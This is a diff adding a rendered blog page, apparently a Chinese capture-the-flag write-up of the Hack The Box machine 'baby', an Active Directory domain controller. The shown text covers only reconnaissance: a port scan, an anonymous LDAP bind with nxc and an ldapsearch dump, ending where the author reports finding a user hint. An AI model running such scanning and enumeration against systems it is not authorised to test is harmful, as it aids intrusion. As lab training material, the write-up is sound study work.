@@ -1,0 +1,1222 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="前期信息\r扫描出来是纯正的域控\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/baby] └─$ .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Nmap? More like slowmap.🐢 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.71:53 Open 10.129.234.71:88 Open 10.129.234.71:135 Open 10.129.234.71:139 Open 10.129.234.71:389 Open 10.129.234.71:464 Open 10.129.234.71:445 Open 10.129.234.71:593 Open 10.129.234.71:636 Open 10.129.234.71:3268 Open 10.129.234.71:3269 Open 10.129.234.71:3389 Open 10.129.234.71:5985 Open 10.129.234.71:9389 基本信息\n">
+<title>baby-wp</title>
+
+<link rel='canonical' href='http://localhost:1313/post/baby/'>
+
+<link rel="stylesheet" href="/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="baby-wp">
+<meta property='og:description' content="前期信息\r扫描出来是纯正的域控\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/baby] └─$ .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Nmap? More like slowmap.🐢 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.71:53 Open 10.129.234.71:88 Open 10.129.234.71:135 Open 10.129.234.71:139 Open 10.129.234.71:389 Open 10.129.234.71:464 Open 10.129.234.71:445 Open 10.129.234.71:593 Open 10.129.234.71:636 Open 10.129.234.71:3268 Open 10.129.234.71:3269 Open 10.129.234.71:3389 Open 10.129.234.71:5985 Open 10.129.234.71:9389 基本信息\n">
+<meta property='og:url' content='http://localhost:1313/post/baby/'>
+<meta property='og:site_name' content='wackymaker'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='靶机' /><meta property='article:tag' content='htb' /><meta property='article:tag' content='域之魔法' /><meta property='article:published_time' content='2025-09-19T11:54:55&#43;08:00'/><meta property='article:modified_time' content='2025-09-19T11:54:55&#43;08:00'/>
+<meta name="twitter:title" content="baby-wp">
+<meta name="twitter:description" content="前期信息\r扫描出来是纯正的域控\n┌──(wackymaker㉿kali)-[~/tmp/hackthebox/baby] └─$ .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-&#39; `-&#39;`-----&#39;`----&#39; `-&#39; `----&#39; `---&#39; `-&#39; `-&#39;`-&#39; `-&#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- Nmap? More like slowmap.🐢 [~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34; [!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers [!] Your file limit is very small, which negatively impacts RustScan&#39;s speed. Use the Docker image, or up the Ulimit with &#39;--ulimit 5000&#39;. Open 10.129.234.71:53 Open 10.129.234.71:88 Open 10.129.234.71:135 Open 10.129.234.71:139 Open 10.129.234.71:389 Open 10.129.234.71:464 Open 10.129.234.71:445 Open 10.129.234.71:593 Open 10.129.234.71:636 Open 10.129.234.71:3268 Open 10.129.234.71:3269 Open 10.129.234.71:3389 Open 10.129.234.71:5985 Open 10.129.234.71:9389 基本信息\n">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu_6baab66dae07af16.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">wackymaker</a></h1>
+            <h2 class="site-description"></h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://space.bilibili.com/'
+                        target="_blank"
+                        title="Bilibili"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-link" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M10 14a3.5 3.5 0 0 0 5 0l4 -4a3.5 3.5 0 0 0 -5 -5l-.5 .5" />
+  <path d="M14 10a3.5 3.5 0 0 0 -5 0l-4 4a3.5 3.5 0 0 0 5 5l.5 -.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/wackymaker'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/' >
+                
+                
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/links/' >
+                
+                
+                
+                <span>Links</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#前期信息">前期信息</a></li>
+    <li><a href="#入口">入口</a></li>
+    <li><a href="#提权">提权</a></li>
+  </ul>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/%E9%A2%98%E7%9B%AEwp/" >
+                题目wp
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/post/baby/">baby-wp</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 19, 2025</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    13 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h2 id="前期信息">前期信息
+</h2><p>扫描出来是纯正的域控</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ .----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+</span></span><span style="display:flex;"><span>| <span style="color:#f92672">{}</span>  <span style="color:#f92672">}</span>| <span style="color:#f92672">{</span> <span style="color:#f92672">}</span> |<span style="color:#f92672">{</span> <span style="color:#f92672">{</span>__ <span style="color:#f92672">{</span>_   _<span style="color:#f92672">}{</span> <span style="color:#f92672">{</span>__  /  ___<span style="color:#f92672">}</span> / <span style="color:#f92672">{}</span> <span style="color:#ae81ff">\ </span>|  <span style="color:#e6db74">`</span>| |
+</span></span><span style="display:flex;"><span>| .-. <span style="color:#ae81ff">\|</span> <span style="color:#f92672">{</span>_<span style="color:#f92672">}</span> |.-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span> | |  .-._<span style="color:#f92672">}</span> <span style="color:#f92672">}</span><span style="color:#ae81ff">\ </span>    <span style="color:#f92672">}</span>/  /<span style="color:#ae81ff">\ </span> <span style="color:#ae81ff">\|</span> |<span style="color:#ae81ff">\ </span> |
+</span></span><span style="display:flex;"><span><span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39; `-&#39;</span><span style="color:#e6db74">`</span>-----<span style="color:#e6db74">&#39;`----&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;  `----&#39;</span>  <span style="color:#e6db74">`</span>---<span style="color:#e6db74">&#39; `-&#39;</span>  <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;`-&#39;</span> <span style="color:#e6db74">`</span>-<span style="color:#e6db74">&#39;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">The Modern Day Port Scanner.
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">________________________________________
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: http://discord.skerritt.blog         :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">: https://github.com/RustScan/RustScan :
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74"> --------------------------------------
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Nmap? More like slowmap.🐢
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[~] The config file is expected to be at &#34;/home/wackymaker/.rustscan.toml&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">[!] Your file limit is very small, which negatively impacts RustScan&#39;</span>s speed. Use the Docker image, or up the Ulimit with <span style="color:#e6db74">&#39;--ulimit 5000&#39;</span>. 
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:53
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:88
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:135
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:139
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:389
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:464
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:445
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:593
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:636
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:3268
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:3269
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:3389
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:5985
+</span></span><span style="display:flex;"><span>Open 10.129.234.71:9389
+</span></span></code></pre></div><p>基本信息</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ cat start.sh 
+</span></span><span style="display:flex;"><span>ip<span style="color:#f92672">=</span>10.129.234.71
+</span></span><span style="display:flex;"><span>domain<span style="color:#f92672">=</span>baby.vl
+</span></span><span style="display:flex;"><span>FQDN<span style="color:#f92672">=</span>BABYDC.baby.vl
+</span></span></code></pre></div><h2 id="入口">入口
+</h2><p>查询过了没有smb匿名和rpc匿名，在爆破用户前我需要先查看一下ldap，发现存在匿名</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-zsh" data-lang="zsh"><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ nxc ldap $ip -u <span style="color:#e6db74">&#34;&#34;</span> -p <span style="color:#e6db74">&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.71   <span style="color:#ae81ff">389</span>    BABYDC           <span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> Windows Server <span style="color:#ae81ff">2022</span> Build <span style="color:#ae81ff">20348</span> <span style="color:#f92672">(</span>name:BABYDC<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>domain:baby.vl<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>signing:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>channel binding:No TLS cert<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>LDAP        10.129.234.71   <span style="color:#ae81ff">389</span>    BABYDC           <span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> baby.vl<span style="color:#ae81ff">\:</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──<span style="color:#f92672">(</span>wackymaker㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/tmp/hackthebox/baby<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>└─$ ldapsearch -x -H ldap://$ip -b <span style="color:#e6db74">&#34;&#34;</span> -s base
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># extended LDIF</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># LDAPv3</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># base &lt;&gt; with scope baseObject</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># filter: (objectclass=*)</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># requesting: ALL</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#</span>
+</span></span><span style="display:flex;"><span>dn:
+</span></span><span style="display:flex;"><span>domainFunctionality: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>forestFunctionality: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>domainControllerFunctionality: <span style="color:#ae81ff">7</span>
+</span></span><span style="display:flex;"><span>rootDomainNamingContext: DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>ldapServiceName: baby.vl:babydc$@BABY.VL
+</span></span><span style="display:flex;"><span>isGlobalCatalogReady: TRUE
+</span></span><span style="display:flex;"><span>supportedSASLMechanisms: GSSAPI
+</span></span><span style="display:flex;"><span>supportedSASLMechanisms: GSS-SPNEGO
+</span></span><span style="display:flex;"><span>supportedSASLMechanisms: EXTERNAL
+</span></span><span style="display:flex;"><span>supportedSASLMechanisms: DIGEST-MD5
+</span></span><span style="display:flex;"><span>supportedLDAPVersion: <span style="color:#ae81ff">3</span>
+</span></span><span style="display:flex;"><span>supportedLDAPVersion: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxPoolThreads
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxPercentDirSyncRequests
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxDatagramRecv
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxReceiveBuffer
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxPreAuthReceiveBuffer
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: InitRecvTimeout
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxConnections
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxConnIdleTime
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxPageSize
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxBatchReturnMessages
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxQueryDuration
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxDirSyncDuration
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxTempTableSize
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxResultSetSize
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MinResultSets
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxResultSetsPerConn
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxNotificationPerConn
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxValRange
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: MaxValRangeTransitive
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: ThreadMemoryLimit
+</span></span><span style="display:flex;"><span>supportedLDAPPolicies: SystemMemoryLimitPercent
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.319
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.801
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.473
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.528
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.417
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.619
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.841
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.529
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.805
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.521
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.970
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1338
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.474
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1339
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1340
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1413
+</span></span><span style="display:flex;"><span>supportedControl: 2.16.840.1.113730.3.4.9
+</span></span><span style="display:flex;"><span>supportedControl: 2.16.840.1.113730.3.4.10
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1504
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1852
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.802
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1907
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1948
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1974
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.1341
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2026
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2064
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2065
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2066
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2090
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2205
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2204
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2206
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2211
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2239
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2255
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2256
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2309
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2330
+</span></span><span style="display:flex;"><span>supportedControl: 1.2.840.113556.1.4.2354
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.800
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.1670
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.1791
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.1935
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.2080
+</span></span><span style="display:flex;"><span>supportedCapabilities: 1.2.840.113556.1.4.2237
+</span></span><span style="display:flex;"><span>subschemaSubentry: CN<span style="color:#f92672">=</span>Aggregate,CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>serverName: CN<span style="color:#f92672">=</span>BABYDC,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Name,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Config
+</span></span><span style="display:flex;"><span> uration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>schemaNamingContext: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>namingContexts: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>namingContexts: CN<span style="color:#f92672">=</span>Schema,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>DomainDnsZones,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>namingContexts: DC<span style="color:#f92672">=</span>ForestDnsZones,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>isSynchronized: TRUE
+</span></span><span style="display:flex;"><span>highestCommittedUSN: <span style="color:#ae81ff">118878</span>
+</span></span><span style="display:flex;"><span>dsServiceName: CN<span style="color:#f92672">=</span>NTDS Settings,CN<span style="color:#f92672">=</span>BABYDC,CN<span style="color:#f92672">=</span>Servers,CN<span style="color:#f92672">=</span>Default-First-Site-Nam
+</span></span><span style="display:flex;"><span> e,CN<span style="color:#f92672">=</span>Sites,CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>dnsHostName: BabyDC.baby.vl
+</span></span><span style="display:flex;"><span>defaultNamingContext: DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>currentTime: 20250919021248.0Z
+</span></span><span style="display:flex;"><span>configurationNamingContext: CN<span style="color:#f92672">=</span>Configuration,DC<span style="color:#f92672">=</span>baby,DC<span style="color:#f92672">=</span>vl
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># search result</span>
+</span></span><span style="display:flex;"><span>search: <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>result: <span style="color:#ae81ff">0</span> Success
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numResponses: 2</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># numEntries: 1</span>
+</span></span></code></pre></div><p>利用nxc获得了一个用户的提示</p>
